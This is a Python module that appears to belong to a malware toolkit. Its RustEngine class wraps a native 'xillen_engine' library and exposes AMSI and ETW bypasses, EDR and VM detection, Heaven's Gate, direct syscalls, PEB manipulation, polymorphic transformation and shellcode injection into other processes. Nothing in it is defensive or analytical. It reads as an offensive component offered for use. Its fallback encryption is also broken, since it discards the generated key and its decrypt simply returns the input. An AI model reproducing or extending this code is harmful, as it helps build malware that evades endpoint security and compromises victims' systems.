import ctypes
import os
import sys
from pathlib import Path

class RustEngine:
    def __init__(self):
        self.engine = None
        self._load_engine()
    
    def _load_engine(self):
        try:
            import xillen_engine
            self.engine = xillen_engine.XillenEngine()
        except ImportError as e:
            print(f"Rust engine not available: {e}")
            self.engine = None
    
    def is_available(self):
        return self.engine is not None
    
    def encrypt_data(self, data, key=None):
        if self.engine:
            return self.engine.encrypt_data(data, key)
        return self._fallback_encrypt(data)
    
    def decrypt_data(self, encrypted, key=None):
        if self.engine:
            return self.engine.decrypt_data(encrypted, key)
        return self._fallback_decrypt(encrypted)
    
    def hash_blake3(self, data):
        if self.engine:
            return self.engine.hash_blake3(data)
        return self._fallback_hash(data)
    
    def bypass_amsi_hw(self):
        if self.engine:
            return self.engine.bypass_amsi_hw()
        return False
    
    def bypass_etw_advanced(self):
        if self.engine:
            return self.engine.bypass_etw_advanced()
        return False
    
    def detect_edr(self):
        if self.engine:
            return self.engine.detect_edr()
        return []
    
    def heavens_gate(self, func_addr):
        if self.engine:
            return self.engine.heavens_gate(func_addr)
        return False
    
    def direct_syscall(self, syscall_num, args):
        if self.engine:
            return self.engine.direct_syscall(syscall_num, args)
        return 0
    
    def peb_manipulation(self):
        if self.engine:
            return self.engine.peb_manipulation()
        return False
    
    def secure_allocate(self, size):
        if self.engine:
            return self.engine.secure_allocate(size)
        return 0
    
    def secure_free(self, addr):
        if self.engine:
            return self.engine.secure_free(addr)
        return False
    
    def zero_memory(self, addr, size):
        if self.engine:
            return self.engine.zero_memory(addr, size)
        return False
    
    def polymorphic_transform(self, code):
        if self.engine:
            return self.engine.polymorphic_transform(code)
        return code
    
    def check_vm_environment(self):
        if self.engine:
            return self.engine.check_vm_environment()
        return {}
    
    def inject_process(self, target_pid, shellcode):
        if self.engine:
            return self.engine.inject_process(target_pid, shellcode)
        return False
    
    def _fallback_encrypt(self, data):
        try:
            from cryptography.fernet import Fernet
            key = Fernet.generate_key()
            f = Fernet(key)
            encrypted = f.encrypt(data.encode())
            return encrypted.decode()
        except:
            return data
    
    def _fallback_decrypt(self, encrypted):
        return encrypted
    
    def _fallback_hash(self, data):
        import hashlib
        return hashlib.sha256(data.encode()).hexdigest()
